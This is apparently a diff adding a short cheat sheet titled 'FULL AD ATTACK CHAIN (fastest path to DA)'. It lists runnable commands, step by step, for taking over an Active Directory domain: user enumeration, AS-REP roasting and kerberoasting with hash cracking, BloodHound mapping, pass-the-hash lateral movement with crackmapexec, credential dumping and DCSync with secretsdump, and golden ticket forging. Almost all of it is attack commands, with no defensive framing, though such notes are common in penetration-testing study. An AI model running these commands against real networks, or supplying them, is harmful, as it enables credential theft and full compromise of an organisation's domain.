@@ -1,0 +1,18 @@
+FULL AD ATTACK CHAIN (fastest path to DA)
+bash# 1. No creds
+kerbrute userenum --dc DC_IP -d domain.com users.txt
+impacket-GetNPUsers domain.com/ -dc-ip DC_IP -request   # AS-REP
+hashcat -m 18200 asrep.txt rockyou.txt
+
+# 2. Got low priv creds
+bloodhound-python -u user -p pass -d domain.com -ns DC_IP -c All
+impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request  # kerberoast
+crackmapexec smb subnet/24 -u user -p pass   # find local admin
+
+# 3. Got local admin somewhere
+impacket-secretsdump user:pass@target   # dump local hashes
+crackmapexec smb subnet/24 -u admin -H NTLM_HASH  # spread laterally
+
+# 4. Got DA hash
+impacket-secretsdump domain/admin:pass@DC_IP -just-dc  # DCSync all
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain domain.com Administrator  # golden ticket
